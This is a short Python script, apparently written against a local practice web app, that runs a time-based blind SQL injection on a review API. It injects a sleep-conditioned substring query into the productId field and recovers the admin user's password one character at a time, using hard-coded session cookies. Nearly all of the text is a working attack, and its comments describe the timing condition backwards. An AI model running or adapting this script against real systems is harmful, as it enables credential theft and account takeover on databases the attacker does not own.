import string
import requests

#if the substring is equal to the character the if selects 1,normal response time
#if the substring is not equal to the character the if selects sleep(5) ,response takes longer

our_payload = "4',if((select substring(password,1,1) from users where username='test')='t', sleep(5), 1))-- -"

def error_sql_injection() :
    url="http://localhost:3000/api/review"
    cookies = {
        "connect.sid": "s%3AdgGnNzIbGhY63B_PLAE80vhcJ-HrDZGE.BGfgeroHFXIQwci68w8nII4WQNoi%2B9IoM%2FKp8GDIp48",
        "session_cookie": "s%3AnXT1XJmEKvAmrmPBL_26qBadzj8kMqCR.Hc%2Bps7i%2Fo4uaCNunTfvLUcu%2Bcj9Ghqk%2FysoeAS6p1Wc"
    }
    username = "admin"
    password_length = 255 #max lenth  
    password_chars = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
    password=""
    # let's execute the attack
    for pos in range (1,password_length+1):
        for char in password_chars:
            found=0
            payload = f"4',if((select substring(password,{pos},1) from users where username='{username}')='{char}', sleep(5), 1))-- -"
            data = {
                "productId": payload,
                "rating": 5
            }
            r = requests.post(url, data=data, cookies=cookies)
            response_time = r.elapsed.total_seconds()  # in seconds
            if r.status_code == 200 and response_time >= 5:
                password += char
                print(password)
                found=1
                break
            elif r.status_code == 200: 
                continue
            # in case of an unsuspected error
            else:
                print(f"[-] Error: {r.status_code}")
                print(r.text)
                return None
        if(not found):#no charcater mathed most likely means the password is over
            break
    return password

password = error_sql_injection()
if(password):
    print("guessed password :",password)
else :
    print("fail")